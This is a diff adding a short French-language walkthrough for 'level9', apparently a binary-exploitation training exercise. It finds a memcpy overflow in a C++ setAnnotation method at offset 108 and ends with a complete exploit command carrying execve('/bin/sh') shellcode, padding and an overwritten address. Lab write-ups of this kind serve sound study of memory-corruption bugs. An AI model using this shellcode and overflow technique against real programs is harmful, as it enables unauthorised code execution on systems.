@@ -1,1 +1,27 @@
+Nous sommes ici en presence d'un binaire level9qui est ecrit en cpp et qui n'execute aucune commande "/bin/sh"
+Pour ce level je n'afficherai pas les differents desassemblages de gdb car je ne trouve pas cela utile etant donné que toutes les anciennes focntions et les prochaines sont en C
+
+
+En regardant de plus pres les fonctions presentes grace a gdb nous remarquons 5 fonctions :
+
+0x080486f6  N::N(int)
+0x0804870e  N::setAnnotation(char*)
+0x0804873a  N::operator+(N&)
+0x0804874e  N::operator-(N&)
+0x080485f4  main
+
+Dans setAnnotation nous voyons la presence d'un memcpy que nous allons surement pouvoir utiliser pour essayer d'executer un shellcode
+
+Dans gdb essayons nous voyons que le registre eax est ecrasé a partir de l'offset 108, registre utilise dans memcpy
+
+Montons donc notre payload :
+
+Pour cela nous avons besoin de l'adresse de eax juste apres l'appel a la fonction setAnnotation : 
+b*main+136
+r CODE
+info reg
+eax            0x804a00c	134520844
+
+Notre exploit sera de la forme suivante : [addr]4 + [shellcode]45 + [padding]59 + [eip]
+
 ./level9 `python -c 'print "\x0c\xa0\x04\x08" + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "A" * 59 + "\x0c\xa0\x04\x08"'`
